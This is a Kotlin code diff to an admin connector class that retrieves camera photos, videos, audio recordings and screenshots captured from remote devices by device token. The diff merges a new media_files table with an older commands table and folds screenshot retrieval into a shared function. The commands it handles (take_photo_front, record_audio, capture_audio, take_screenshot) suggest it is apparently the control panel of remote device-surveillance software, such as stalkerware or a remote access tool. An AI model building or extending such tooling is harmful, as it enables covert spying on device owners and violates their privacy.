@@ -413,6 +413,64 @@ class SupabaseAdminConnector {
     }
 
     private suspend fun getMediaRecords(deviceToken: String, filterType: String): List<MediaItem> = withContext(Dispatchers.IO) {
+        val list = mutableListOf<MediaItem>()
+
+        // 1. Fetch from new media_files table 
+        try {
+            val mediaTypes = when(filterType) {
+                "camera_photo" -> listOf("take_photo", "take_photo_front", "take_photo_back")
+                "video_record" -> listOf("record_video", "record_video_front", "record_video_back")
+                "audio_record" -> listOf("record_audio", "capture_audio")
+                "screenshot" -> listOf("take_screenshot", "screenshot")
+                else -> listOf(filterType)
+            }
+            val typesFilter = mediaTypes.joinToString(",")
+            val request = Request.Builder()
+                .url("$rootUrl/rest/v1/media_files?device_token=eq.$deviceToken&file_type=in.($typesFilter)&order=created_at.desc")
+                .addSupabaseHeaders()
+                .get()
+                .build()
+
+            client.newCall(request).execute().use { response ->
+                val bodyStr = response.body?.string() ?: ""
+                if (bodyStr.startsWith("[")) {
+                    val arr = JSONArray(bodyStr)
+                    for (i in 0 until arr.length()) {
+                        val obj = arr.optJSONObject(i) ?: continue
+                        val fileUrl = obj.optString("file_url").takeIf { it.isNotBlank() && it != "null" }
+                        val createdStr = obj.optString("created_at")
+                        var ts = System.currentTimeMillis()
+                        if (createdStr.isNotBlank() && createdStr != "null") {
+                            try {
+                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                                    val instant = java.time.Instant.parse(createdStr)
+                                    ts = instant.toEpochMilli()
+                                } else {
+                                    val sdf = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSSSSSZ", java.util.Locale.US)
+                                    ts = sdf.parse(createdStr)?.time ?: System.currentTimeMillis()
+                                }
+                            } catch (e: Exception) {
+                                // fallback
+                            }
+                        }
+                        if (fileUrl != null) {
+                            list.add(MediaItem(
+                                id = obj.optString("id"),
+                                base64 = "",
+                                url = fileUrl,
+                                timestamp = ts,
+                                type = filterType,
+                                cameraType = null
+                            ))
+                        }
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            Log.e("SupabaseConnector", "Error fetching from media_files", e)
+        }
+
+        // 2. Fetch from old commands table
         val request = Request.Builder()
             .url("$rootUrl/rest/v1/commands?device_token=eq.$deviceToken&order=timestamp.desc")
             .addSupabaseHeaders()
@@ -420,8 +478,7 @@ class SupabaseAdminConnector {
             .build()
         try {
             client.newCall(request).execute().use { response ->
-                val bodyStr = response.body?.string() ?: return@withContext emptyList()
-                val list = mutableListOf<MediaItem>()
+                val bodyStr = response.body?.string() ?: return@withContext list
                 if (bodyStr.startsWith("[")) {
                     val arr = JSONArray(bodyStr)
                     for (i in 0 until arr.length()) {
@@ -429,11 +486,12 @@ class SupabaseAdminConnector {
                         val cmdType = obj.optString("command")
                         
                         // Map the commands to our filterTypes
-                        // filterType is "camera_photo", "video_record", "audio_record"
+                        // filterType is "camera_photo", "video_record", "audio_record", "screenshot"
                         val isMatch = when(filterType) {
                             "camera_photo" -> cmdType == "take_photo"
                             "video_record" -> cmdType == "record_video" || cmdType == "record_video_front" || cmdType == "record_video_back"
                             "audio_record" -> cmdType == "record_audio" || cmdType == "capture_audio"
+                            "screenshot" -> cmdType == "take_screenshot" || cmdType == "screenshot"
                             else -> false
                         }
                         
@@ -450,6 +508,7 @@ class SupabaseAdminConnector {
                             list.add(MediaItem(
                                 id = obj.optString("id"),
                                 base64 = b64,
+                                url = "",
                                 timestamp = obj.optLong("timestamp"),
                                 type = filterType,
                                 cameraType = null
@@ -457,50 +516,12 @@ class SupabaseAdminConnector {
                         }
                     }
                 }
-                return@withContext list
+                return@withContext list.sortedByDescending { it.timestamp }
             }
-        } catch (e: Exception) { return@withContext emptyList() }
+        } catch (e: Exception) { return@withContext list }
     }
 
-    suspend fun getScreenshots(deviceToken: String): List<MediaItem> = withContext(Dispatchers.IO) {
-        val request = Request.Builder()
-            .url("$rootUrl/rest/v1/commands?device_token=eq.$deviceToken&order=timestamp.desc")
-            .addSupabaseHeaders()
-            .get()
-            .build()
-        client.newCall(request).execute().use { response ->
-            val bodyStr = response.body?.string() ?: throw Exception("Empty response body")
-            if (!response.isSuccessful) { throw java.lang.Exception("DB Error: $bodyStr") }
-            Log.d("SupabaseConnector", "getScreenshots payload: ${bodyStr.take(500)}")
-            val list = mutableListOf<MediaItem>()
-            if (bodyStr.startsWith("[")) {
-                val arr = JSONArray(bodyStr)
-                for (i in 0 until arr.length()) {
-                    val obj = arr.optJSONObject(i) ?: continue
-                    
-                    // The column for command response might be named differently
-                    // Try different possibilities based on user prompt.
-                    val b64 = obj.optString("response_data").takeIf { it.isNotBlank() && it != "null" }
-                           ?: obj.optString("command_response").takeIf { it.isNotBlank() && it != "null" }
-                           ?: obj.optString("result").takeIf { it.isNotBlank() && it != "null" }
-                           ?: obj.optString("image_code").takeIf { it.isNotBlank() && it != "null" }
-                           ?: obj.optString("base64_data").takeIf { it.isNotBlank() && it != "null" }
-                           ?: obj.optString("response").takeIf { it.isNotBlank() && it != "null" }
-
-                    if(b64 != null && (obj.optString("command") == "take_screenshot" || obj.optString("command") == "screenshot")) {
-                        list.add(MediaItem(
-                            id = obj.optString("id"),
-                            base64 = b64,
-                            timestamp = obj.optLong("timestamp"),
-                            type = "screenshot",
-                            cameraType = null
-                        ))
-                    }
-                }
-            }
-            return@withContext list
-        }
-    }
+    suspend fun getScreenshots(deviceToken: String): List<MediaItem> = getMediaRecords(deviceToken, "screenshot")
     suspend fun getCameraPhotos(deviceToken: String) = getMediaRecords(deviceToken, "camera_photo")
     suspend fun getCameraVideos(deviceToken: String) = getMediaRecords(deviceToken, "video_record")
     suspend fun getAudioRecords(deviceToken: String) = getMediaRecords(deviceToken, "audio_record")
